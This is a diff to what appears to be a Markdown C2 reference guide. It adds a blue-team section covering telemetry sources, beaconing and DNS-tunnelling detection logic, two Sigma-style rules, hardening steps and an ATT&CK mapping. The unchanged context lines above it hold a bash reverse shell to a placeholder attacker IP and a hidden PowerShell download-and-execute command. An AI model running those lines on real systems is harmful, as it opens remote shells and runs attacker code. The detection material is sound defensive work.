@@ -322,3 +322,73 @@ bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
 # PowerShell reverse shell
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/rev.ps1')"
 ```
+
+---
+
+## Detection & Mitigation
+
+Blue-team guidance for detecting and disrupting C2 activity. Use this to validate
+that defenders can observe the techniques above during an authorized engagement.
+
+### Telemetry & Log Sources
+- **Endpoint:** EDR process/network telemetry; Sysmon — Event ID 1 (process create + command line + hashes), 3 (network connect), 7 (image load), 22 (DNS query).
+- **PowerShell:** Script Block Logging (4104), Module Logging (4103), AMSI events.
+- **Network:** Zeek/Suricata, NetFlow/IPFIX, full PCAP at egress, authenticated forward-proxy logs, recursive DNS logs.
+- **TLS fingerprints:** JA3/JA3S (client/server) and JARM hashes to fingerprint C2 server stacks even over TLS.
+
+### Detection Logic
+- **Beaconing:** near-regular check-in interval (even with jitter) to a small set of destinations; long-lived sessions; skewed bytes-out/bytes-in; uncategorized/newly-registered domains. Tools: RITA, Zeek + statistical beacon analytics.
+- **Known profiles:** default Cobalt Strike / Sliver / Mythic / Havoc / Metasploit URIs, headers, user-agents, and JA3/JARM hashes; default self-signed cert serials.
+- **DNS C2 / tunneling:** high volume of TXT/NULL/CNAME queries, abnormally long labels, high-entropy subdomains, single client → single authoritative domain.
+
+```yaml
+title: Possible DNS Tunneling / DNS C2 (high-entropy long labels)
+logsource:
+  product: windows
+  category: dns_query        # Sysmon Event ID 22
+detection:
+  selection:
+    QueryName|re: '([a-z0-9]{30,}\.)'   # very long single label
+  condition: selection
+  timeframe: 5m
+  # tune: alert when one host issues >50 matching queries to one parent domain in 5m
+level: high
+```
+
+```yaml
+title: Suspicious Outbound to Uncategorized Domain with Beacon-like Cadence
+logsource:
+  product: windows
+  category: network_connection   # Sysmon Event ID 3
+detection:
+  selection:
+    Initiated: 'true'
+    DestinationPort:
+      - 443
+      - 80
+  filter_known:
+    DestinationHostname|endswith:
+      - '.windowsupdate.com'
+      - '.microsoft.com'
+  condition: selection and not filter_known
+  # correlate in SIEM: same (host,dest) every N seconds ± jitter -> beacon
+level: medium
+```
+
+### Hardening & Mitigations
+- **Egress control:** default-deny outbound; force traffic through an authenticated, category-filtering proxy; block newly-registered and uncategorized domains; sinkhole known-bad DNS.
+- **TLS inspection** at the perimeter where lawful/feasible; alert on self-signed and anomalous JA3/JARM.
+- **Application control:** WDAC/AppLocker to stop unsigned loaders; Microsoft ASR rules; disable macros from the internet.
+- **Threat intel:** ingest C2 IOC feeds (IPs, domains, JA3/JARM, default profiles) into SIEM/EDR/firewall.
+- **Segmentation:** restrict east-west movement so a single beacon cannot reach the whole estate.
+
+### MITRE ATT&CK Mapping
+
+| Technique | ID | Detect / Mitigate |
+|-----------|----|-------------------|
+| Application Layer Protocol | T1071 | Proxy logs, JA3/JARM, protocol anomaly detection; egress filtering (M1037) |
+| Protocol: DNS | T1071.004 | DNS logging + entropy/volume analytics; restrict/inspect DNS (M1037) |
+| Encrypted Channel | T1573 | TLS metadata + JA3/JARM; TLS inspection; block self-signed |
+| Proxy / Multi-hop | T1090 | NetFlow path analysis; egress allow-listing (M1037) |
+| Fallback Channels | T1008 | Alert on secondary-channel activation; broad egress control |
+| Ingress Tool Transfer | T1105 | Sysmon 11/3 + EDR; Network Intrusion Prevention (M1031) |
